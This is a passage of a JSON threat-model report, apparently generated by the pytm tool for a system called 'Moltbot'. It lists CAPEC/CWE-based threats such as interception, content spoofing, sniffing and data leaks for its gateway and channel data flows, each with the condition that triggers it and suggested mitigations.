attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "436", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Inbound media to Gateway", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "437", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Inbound media to Gateway", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "438", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Inbound media to Gateway", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "439", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Outbound media to channels", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "440", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Outbound media to channels", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "441", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Outbound media to channels", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "442", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Outbound media to channels", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "443", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Outbound media to channels", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "444", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Outbound media to channels", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "445", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Outbound media to channels", "threat_id": "DR01"}], "ignoreUnused": false, "isOrdered": true, "mergeResponses": false, "name": "Moltbot", "onDuplicates": "Action.NO_ACTION", "threatsFile": "/home/izar/venv/lib/python3.13/site-packages/pytm/threatlib/threats.json"}